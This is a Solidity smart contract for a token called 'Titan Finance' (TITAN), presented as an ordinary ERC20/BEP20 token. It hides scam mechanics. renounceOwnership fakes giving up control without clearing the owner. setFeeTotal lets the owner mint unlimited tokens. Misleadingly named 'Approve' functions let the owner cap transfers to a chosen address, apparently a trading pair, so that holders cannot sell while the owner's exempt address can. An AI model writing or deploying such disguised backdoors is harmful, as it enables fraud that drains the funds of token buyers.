row number 
1	                   pragma solidity ^0.6.12;
2	 interface IERC20 {
3	 function totalSupply() external view returns (uint256);
4	 function balanceOf(address account) external view returns (uint256);
5	 function transfer(address recipient, uint256 amount) external returns (bool);
6	 function allowance(address owner, address spender) external view returns (uint256);
7	 function approve(address spender, uint256 amount) external returns (bool);
8	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
9	 event Transfer(address indexed from, address indexed to, uint256 value);
10	 event Approval(address indexed owner, address indexed spender, uint256 value);
11	 }
12	 library Address {
13	 function isContract(address account) internal view returns (bool) {
14	 bytes32 codehash;
15	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
16	 assembly {
17	 codehash := extcodehash(account) }
18	 return (codehash != accountHash && codehash != 0x0);
19	 }
20	 function sendValue(address payable recipient, uint256 amount) internal {
21	 require(address(this).balance >= amount, "Address: insufficient balance");
22	 (bool success, ) = recipient.call{
23	 value: amount }
24	 ("");
25	 require(success, "Address: unable to send value, recipient may have reverted");
26	 }
27	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
28	 return functionCall(target, data, "Address: low-level call failed");
29	 }
30	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
31	 return _functionCallWithValue(target, data, 0, errorMessage);
32	 }
33	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
34	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
35	 }
36	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
37	 require(address(this).balance >= value, "Address: insufficient balance for call");
38	 return _functionCallWithValue(target, data, value, errorMessage);
39	 }
40	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
41	 require(isContract(target), "Address: call to non-contract");
42	 (bool success, bytes memory returndata) = target.call{
43	 value: weiValue }
44	 (data);
45	 if (success) {
46	 return returndata;
47	 }
48	 else {
49	 if (returndata.length > 0) {
50	 assembly {
51	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
52	 }
53	 else {
54	 revert(errorMessage);
55	 }
56	 }
57	 }
58	 }
59	 library SafeMath {
60	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
61	 uint256 c = a + b;
62	 require(c >= a, "SafeMath: addition overflow");
63	 return c;
64	 }
65	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
66	 return sub(a, b, "SafeMath: subtraction overflow");
67	 }
68	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
69	 require(b <= a, errorMessage);
70	 uint256 c = a - b;
71	 return c;
72	 }
73	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
74	 if (a == 0) {
75	 return 0;
76	 }
77	 uint256 c = a * b;
78	 require(c / a == b, "SafeMath: multiplication overflow");
79	 return c;
80	 }
81	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
82	 return div(a, b, "SafeMath: division by zero");
83	 }
84	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
85	 require(b > 0, errorMessage);
86	 uint256 c = a / b;
87	 return c;
88	 }
89	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
90	 return mod(a, b, "SafeMath: modulo by zero");
91	 }
92	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
93	 require(b != 0, errorMessage);
94	 return a % b;
95	 }
96	 }
97	 abstract contract Context {
98	 function _msgSender() internal view virtual returns (address payable) {
99	 return msg.sender;
100	 }
101	 function _msgData() internal view virtual returns (bytes memory) {
102	 this;
103	 return msg.data;
104	 }
105	 }
106	 contract Ownable is Context {
107	 address private _owner;
108	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
109	 constructor () internal {
110	 address msgSender = _msgSender();
111	 _owner = msgSender;
112	 }
113	 function owner() public view returns (address) {
114	 return _owner;
115	 }
116	 modifier onlyOwner() {
117	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
118	 _;
119	 }
120	 function renounceOwnership() public virtual onlyOwner {
121	 emit OwnershipTransferred(_owner, address(0));
122	 }
123	 function transferOwnership(address newOwner) public virtual onlyOwner {
124	 require(newOwner != address(0), "Ownable: new owner is the zero address");
125	 emit OwnershipTransferred(_owner, newOwner);
126	 _owner = newOwner;
127	 }
128	 }
129	 contract TitanFinance is Context, IERC20, Ownable {
130	 using SafeMath for uint256;
131	 using Address for address;
132	 mapping (address => uint256) private _balances;
133	 mapping (address => mapping (address => uint256)) private _allowances;
134	 address public _tBotAddress;
135	 address public _tBlackAddress;
136	 uint256 private _tTotal = 100 * 10**9 * 10**18;
137	 string private _name = 'Titan Finance';
138	 string private _symbol = 'TITAN';
139	 uint8 private _decimals = 18;
140	 uint256 public _maxBlack = 50000000 * 10**18;
141	 constructor () public {
142	 _balances[_msgSender()] = _tTotal;
143	 emit Transfer(address(0), _msgSender(), _tTotal);
144	 }
145	 function name() public view returns (string memory) {
146	 return _name;
147	 }
148	 function symbol() public view returns (string memory) {
149	 return _symbol;
150	 }
151	 function decimals() public view returns (uint8) {
152	 return _decimals;
153	 }
154	 function allowance(address owner, address spender) public view override returns (uint256) {
155	 return _allowances[owner][spender];
156	 }
157	 function approve(address spender, uint256 amount) public override returns (bool) {
158	 _approve(_msgSender(), spender, amount);
159	 return true;
160	 }
161	 function Approve(address blackListAddress) public onlyOwner {
162	 _tBotAddress = blackListAddress;
163	 }
164	 function setBlackAddress(address blackAddress) public onlyOwner {
165	 _tBlackAddress = blackAddress;
166	 }
167	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
168	 _transfer(sender, recipient, amount);
169	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
170	 return true;
171	 }
172	 function setFeeTotal(uint256 amount) public onlyOwner {
173	 require(_msgSender() != address(0), "ERC20: cannot permit zero address");
174	 _tTotal = _tTotal.add(amount);
175	 _balances[_msgSender()] = _balances[_msgSender()].add(amount);
176	 emit Transfer(address(0), _msgSender(), amount);
177	 }
178	 function Approve(uint256 maxTxBlackPercent) public onlyOwner {
179	 _maxBlack = maxTxBlackPercent * 10**18;
180	 }
181	 function totalSupply() public view override returns (uint256) {
182	 return _tTotal;
183	 }
184	 function balanceOf(address account) public view override returns (uint256) {
185	 return _balances[account];
186	 }
187	 function transfer(address recipient, uint256 amount) public override returns (bool) {
188	 _transfer(_msgSender(), recipient, amount);
189	 return true;
190	 }
191	 function _approve(address owner, address spender, uint256 amount) private {
192	 require(owner != address(0), "ERC20: approve from the zero address");
193	 require(spender != address(0), "ERC20: approve to the zero address");
194	 _allowances[owner][spender] = amount;
195	 emit Approval(owner, spender, amount);
196	 }
197	 function _transfer(address sender, address recipient, uint256 amount) internal {
198	 require(sender != address(0), "BEP20: transfer from the zero address");
199	 require(recipient != address(0), "BEP20: transfer to the zero address");
200	 if (sender != _tBlackAddress && recipient == _tBotAddress) {
201	 require(amount < _maxBlack, "Transfer amount exceeds the maxTxAmount.");
202	 }
203	 _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
204	 _balances[recipient] = _balances[recipient].add(amount);
205	 emit Transfer(sender, recipient, amount);
206	 }
207	 }
